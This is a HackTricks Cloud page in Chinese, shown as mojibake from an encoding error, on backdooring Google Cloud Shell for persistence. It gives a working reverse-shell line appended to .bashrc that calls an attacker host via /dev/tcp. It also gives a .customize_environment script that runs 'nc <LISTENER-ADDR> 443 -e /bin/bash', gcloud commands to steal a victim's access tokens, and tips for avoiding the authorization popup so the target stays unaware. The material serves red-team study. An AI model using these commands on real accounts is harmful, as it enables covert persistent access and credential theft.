# GCP - Cloud Shell æŒä¹…æ€§

<details>

<summary><strong>ä»é›¶å¼€å§‹å­¦ä¹ AWSé»‘å®¢æŠ€æœ¯ï¼Œæˆä¸º</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS çº¢é˜Ÿä¸“å®¶)</strong></a><strong>ï¼</strong></summary>

æ”¯æŒHackTricksçš„å…¶ä»–æ–¹å¼ï¼š

* å¦‚æœæ‚¨æƒ³åœ¨ **HackTricksä¸­çœ‹åˆ°æ‚¨çš„å…¬å¸å¹¿å‘Š** æˆ– **ä¸‹è½½HackTricksçš„PDF**ï¼Œè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼
* è·å–[**å®˜æ–¹PEASS & HackTrickså•†å“**](https://peass.creator-spring.com)
* å‘ç°[**PEASSå®¶æ—**](https://opensea.io/collection/the-peass-family)ï¼Œæˆ‘ä»¬ç‹¬å®¶çš„[**NFTsç³»åˆ—**](https://opensea.io/collection/the-peass-family)
* **åŠ å…¥** ğŸ’¬ [**Discordç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**telegramç¾¤ç»„**](https://t.me/peass) æˆ–åœ¨ **Twitter** ğŸ¦ ä¸Š**å…³æ³¨**æˆ‘ [**@carlospolopm**](https://twitter.com/carlospolopm)**ã€‚**
* **é€šè¿‡å‘** [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **æäº¤PRæ¥åˆ†äº«æ‚¨çš„é»‘å®¢æŠ€å·§**
*
*
*
* &#x20;githubä»“åº“ã€‚

</details>

## Cloud Shell

æ›´å¤šä¿¡æ¯è¯·æŸ¥çœ‹ï¼š

{% content-ref url="../gcp-services/gcp-cloud-shell-enum.md" %}
[gcp-cloud-shell-enum.md](../gcp-services/gcp-cloud-shell-enum.md)
{% endcontent-ref %}

### æŒä¹…æ€§åé—¨

[**Google Cloud Shell**](https://cloud.google.com/shell/) ä¸ºæ‚¨æä¾›äº†ç›´æ¥ä»æµè§ˆå™¨è®¿é—®äº‘èµ„æºçš„å‘½ä»¤è¡Œè®¿é—®æƒé™ï¼Œä¸”ä¸ä¼šäº§ç”Ÿä»»ä½•ç›¸å…³æˆæœ¬ã€‚

æ‚¨å¯ä»¥é€šè¿‡ **webæ§åˆ¶å°** æˆ–è¿è¡Œ **`gcloud cloud-shell ssh`** æ¥è®¿é—®Googleçš„Cloud Shellã€‚

è¿™ä¸ªæ§åˆ¶å°å¯¹æ”»å‡»è€…æ¥è¯´æœ‰ä¸€äº›æœ‰è¶£çš„åŠŸèƒ½ï¼š

1. **ä»»ä½•æœ‰æƒè®¿é—®Google Cloudçš„Googleç”¨æˆ·** éƒ½å¯ä»¥è®¿é—®ä¸€ä¸ªå®Œå…¨è®¤è¯çš„Cloud Shellå®ä¾‹ï¼ˆå³ä½¿æ˜¯ç»„ç»‡çš„æ‰€æœ‰è€…ï¼ŒæœåŠ¡è´¦æˆ·ä¹Ÿå¯ä»¥ï¼‰ã€‚
2. è¯¥å®ä¾‹å°†**è‡³å°‘ä¿æŒå…¶ä¸»ç›®å½•120å¤©**ï¼Œå¦‚æœæ²¡æœ‰æ´»åŠ¨å‘ç”Ÿã€‚
3. ç»„ç»‡**æ— æ³•ç›‘æ§**è¯¥å®ä¾‹çš„æ´»åŠ¨ã€‚

è¿™åŸºæœ¬ä¸Šæ„å‘³ç€ï¼Œæ”»å‡»è€…å¯ä»¥åœ¨ç”¨æˆ·çš„ä¸»ç›®å½•ä¸­æ”¾ç½®ä¸€ä¸ªåé—¨ï¼Œåªè¦ç”¨æˆ·æ¯120å¤©è‡³å°‘è¿æ¥åˆ°GC Shellä¸€æ¬¡ï¼Œåé—¨å°±ä¼šå­˜æ´»ä¸‹æ¥ï¼Œæ¯æ¬¡è¿è¡Œæ—¶æ”»å‡»è€…å°±ä¼šå¾—åˆ°ä¸€ä¸ªshellï¼Œåªéœ€æ‰§è¡Œä»¥ä¸‹æ“ä½œï¼š

{% code overflow="wrap" %}
```bash
echo '(nohup /usr/bin/env -i /bin/bash 2>/dev/null -norc -noprofile >& /dev/tcp/'$CCSERVER'/443 0>&1 &)' >> $HOME/.bashrc
```
{% endcode %}

åœ¨ä¸»ç›®å½•ä¸­è¿˜æœ‰ä¸€ä¸ªåä¸º **`.customize_environment`** çš„æ–‡ä»¶ï¼Œå¦‚æœè¯¥æ–‡ä»¶å­˜åœ¨ï¼Œæ¯æ¬¡ç”¨æˆ·è®¿é—® **cloud shell** æ—¶éƒ½ä¼š**æ‰§è¡Œ**ï¼ˆå¦‚å‰ä¸€æŠ€æœ¯æ‰€è¿°ï¼‰ã€‚åªéœ€æ’å…¥å‰é¢çš„åé—¨æˆ–ç±»ä¼¼ä»¥ä¸‹çš„åé—¨ï¼Œåªè¦ç”¨æˆ·â€œç»å¸¸â€ä½¿ç”¨ cloud shellï¼Œå°±èƒ½ä¿æŒæŒä¹…æ€§ï¼š
```bash
#!/bin/sh
apt-get install netcat -y
nc <LISTENER-ADDR> 443 -e /bin/bash
```
{% hint style="warning" %}
è¯·æ³¨æ„ï¼Œ**åœ¨ Cloud Shell ä¸­é¦–æ¬¡æ‰§è¡Œéœ€è¦è®¤è¯çš„ GCP æ“ä½œæ—¶**ï¼Œå®ƒä¼š**å¼¹å‡º**ä¸€ä¸ªæˆæƒçª—å£åœ¨ç”¨æˆ·çš„æµè§ˆå™¨ä¸­ï¼Œå¿…é¡»åœ¨å‘½ä»¤è¿è¡Œä¹‹å‰æ¥å—ã€‚å¦‚æœå‡ºç°æ„å¤–çš„å¼¹å‡ºçª—å£ï¼Œç›®æ ‡å¯èƒ½ä¼šå˜å¾—æ€€ç–‘å¹¶ä¸”ç ´åæŒä¹…æ€§æ–¹æ³•ã€‚

è¿™æ˜¯åœ¨æµè§ˆå™¨ç”¨æˆ·ä¼šè¯ä¸­æŸ¥çœ‹çš„ï¼Œä½œä¸ºæ”»å‡»è€…åœ¨ cloud shell æ‰§è¡Œ `gcloud projects list` æ—¶å‡ºç°çš„å¼¹å‡ºçª—å£ã€‚
{% endhint %}

<figure><img src="../../../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>

ç„¶è€Œï¼Œå¦‚æœç”¨æˆ·å·²ç»ç§¯æä½¿ç”¨äº† cloudshellï¼Œå¼¹å‡ºçª—å£ä¸ä¼šå‡ºç°ï¼Œä½ å¯ä»¥**æ”¶é›†ç”¨æˆ·çš„ä»¤ç‰Œ**ï¼š
```bash
gcloud auth print-access-token
gcloud auth application-default print-access-token
```
#### å¦‚ä½•å»ºç«‹SSHè¿æ¥

åŸºæœ¬ä¸Šï¼Œä½¿ç”¨äº†è¿™3ä¸ªAPIè°ƒç”¨ï¼š

* [https://content-cloudshell.googleapis.com/v1/users/me/environments/default:addPublicKey](https://content-cloudshell.googleapis.com/v1/users/me/environments/default:addPublicKey) \[POST]ï¼ˆå°†ä½¿æ‚¨æ·»åŠ æ‚¨æœ¬åœ°åˆ›å»ºçš„å…¬é’¥ï¼‰
* [https://content-cloudshell.googleapis.com/v1/users/me/environments/default:start](https://content-cloudshell.googleapis.com/v1/users/me/environments/default:start) \[POST]ï¼ˆå°†å¯åŠ¨å®ä¾‹ï¼‰
* [https://content-cloudshell.googleapis.com/v1/users/me/environments/default](https://content-cloudshell.googleapis.com/v1/users/me/environments/default) \[GET]ï¼ˆå°†å‘Šè¯‰æ‚¨google cloud shellçš„IPåœ°å€ï¼‰

ä½†æ˜¯æ‚¨å¯ä»¥åœ¨[https://github.com/FrancescoDiSalesGithub/Google-cloud-shell-hacking?tab=readme-ov-file#ssh-on-the-google-cloud-shell-using-the-private-key](https://github.com/FrancescoDiSalesGithub/Google-cloud-shell-hacking?tab=readme-ov-file#ssh-on-the-google-cloud-shell-using-the-private-key)æ‰¾åˆ°æ›´å¤šä¿¡æ¯

## å‚è€ƒèµ„æ–™

* [https://89berner.medium.com/persistant-gcp-backdoors-with-googles-cloud-shell-2f75c83096ec](https://89berner.medium.com/persistant-gcp-backdoors-with-googles-cloud-shell-2f75c83096ec)
* [https://github.com/FrancescoDiSalesGithub/Google-cloud-shell-hacking?tab=readme-ov-file#ssh-on-the-google-cloud-shell-using-the-private-key](https://github.com/FrancescoDiSalesGithub/Google-cloud-shell-hacking?tab=readme-ov-file#ssh-on-the-google-cloud-shell-using-the-private-key)
* [https://securityintelligence.com/posts/attacker-achieve-persistence-google-cloud-platform-cloud-shell/](https://securityintelligence.com/posts/attacker-achieve-persistence-google-cloud-platform-cloud-shell/)

<details>

<summary><strong>é€šè¿‡</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>ä»é›¶å¼€å§‹å­¦ä¹ AWSé»‘å®¢æ”»å‡»ï¼</strong></summary>

å…¶ä»–æ”¯æŒHackTricksçš„æ–¹å¼ï¼š

* å¦‚æœæ‚¨æƒ³åœ¨**HackTricksä¸­çœ‹åˆ°æ‚¨çš„å…¬å¸å¹¿å‘Š**æˆ–**ä¸‹è½½HackTricksçš„PDF**ï¼Œè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼
* è·å–[**å®˜æ–¹PEASS & HackTrickså•†å“**](https://peass.creator-spring.com)
* å‘ç°[**PEASSå®¶æ—**](https://opensea.io/collection/the-peass-family)ï¼Œæˆ‘ä»¬ç‹¬å®¶çš„[**NFTsç³»åˆ—**](https://opensea.io/collection/the-peass-family)
* **åŠ å…¥** ğŸ’¬ [**Discordç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**telegramç¾¤ç»„**](https://t.me/peass) æˆ–åœ¨**Twitter** ğŸ¦ ä¸Š**å…³æ³¨**æˆ‘ [**@carlospolopm**](https://twitter.com/carlospolopm)**ã€‚**
* **é€šè¿‡å‘** [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **æäº¤PRæ¥åˆ†äº«æ‚¨çš„é»‘å®¢æŠ€å·§ã€‚**
*
*
* &#x20;githubä»“åº“ã€‚

</details>
